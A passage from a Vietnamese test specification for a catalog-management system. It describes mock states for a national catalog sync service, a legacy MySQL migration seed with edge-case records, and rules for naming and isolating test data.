| F-NEWCAT | `new_catalog.xlsx` | Khuôn chuẩn kèm sheet `ThuocTinh` khai báo thuộc tính cho chế độ CREATE_CATALOG | | TS-07-09 |
| F-DVHC-CONV | `ma_dvhc_cu.csv` | 1.000 mã ĐVHC cũ (giả lập và chính thức) cần chuyển | | TS-07-17 |

### 2.6. Dữ liệu cho đồng bộ quốc gia và di trú

WireMock giả lập dịch vụ DMDC quốc gia (qua PH-14) có các trạng thái kịch bản sau. Mỗi trạng thái trả một "phiên bản từ xa" (`remote_version`) khác nhau để kiểm thử phát hiện thay đổi.

| Trạng thái | Nội dung trả cho danh mục `GIOI_TINH` (và `DAN_TOC` khi ghi rõ) | Phân loại mong đợi |
|---|---|---|
| `BASE` | Giống hệt phiên bản hiện hành | Không đổi (`NO_CHANGE`) |
| `ADDED_5` | `DAN_TOC` thêm 5 mã `56`…`60` | Không phá vỡ |
| `RENAMED_2` | `GIOI_TINH` đổi tên 2 bản ghi | Không phá vỡ |
| `REMOVED_1` | `GIOI_TINH` mất mã `3` | Phá vỡ |
| `ATTR_TYPE_CHANGED` | `DAN_TOC` đổi kiểu thuộc tính `ten_khac` thành INTEGER | Phá vỡ |
| `HTTP_500` | Lỗi máy chủ | Lần chạy `FAILED`, ERR-07-028 |
| `TIMEOUT` | Trễ 65 giây (vượt thời gian chờ 30 giây) | Lần chạy `FAILED`, ERR-07-028 |
| `MALFORMED` | JSON thiếu trường bắt buộc | Lần chạy `FAILED` |

Dữ liệu di trú Aita được dựng trên MySQL 8 trong Testcontainers theo đúng lược đồ bốn bảng của hệ cũ (`category`, `category_fields`, `category_details`, `category_details_value`). Bộ mồi `aita_seed.sql` gồm: 40 danh mục, trong đó 1 danh mục có giá trị dài 2.000 ký tự (đúng giới hạn `varchar(2000)` cũ), 1 danh mục có hai bản ghi mã chỉ khác hoa thường và khoảng trắng đầu cuối (" ab01" và "AB01"), 1 danh mục có thuộc tính trạng thái ẩn (`status = 0`) và thứ tự `Order` không liên tục, 1 danh mục `Is_update = 1` (từ NGSP), 1 danh mục tên trùng tên một danh mục COMMON, 1 danh mục rỗng (không bản ghi), 1 danh mục có giá trị chứa ký tự điều khiển và emoji, tổng 12.345 bản ghi và 61.725 giá trị. Không có dữ liệu cá nhân thật trong bộ mồi.

### 2.7. Nguyên tắc dữ liệu

Mọi ca kiểm thử tạo dữ liệu mới phải dùng mã có tiền tố `TC{nnn}_` (ví dụ `TC015_DM_A`) để dọn dẹp được và không va chạm giữa các ca chạy song song. Ca kiểm thử chạy song song không được sửa danh mục dùng chung của bộ dữ liệu chuẩn; ca nào cần sửa (ví dụ phát hành `LOAI_HINH_TC`) phải chạy trong nhóm tuần tự `@Isolated` hoặc trên bản sao danh mục tạo bằng chế độ CREATE_CATALOG. Đồng hồ hệ thống trong IT được điều khiển bằng `Clock` tiêm vào (múi giờ `Asia/Ho_Chi_Minh`); ngày "hôm nay" mặc định của bộ dữ liệu là 2026-11-21.

